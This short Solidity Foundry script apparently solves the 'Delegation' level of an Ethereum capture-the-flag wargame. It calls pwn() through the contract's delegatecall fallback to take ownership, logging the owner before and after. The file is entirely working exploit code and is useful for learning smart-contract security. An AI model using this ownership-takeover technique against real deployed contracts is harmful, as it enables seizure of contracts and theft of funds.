// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/06_Delegation.sol";

contract AttackerDelegationScript is Script {
    Delegation delegation = Delegation(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        console.log("Current owner is : ", delegation.owner());
        (bool success, ) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Call failed");
        console.log("New owner is : ", delegation.owner());

        vm.stopBroadcast();
    }
}
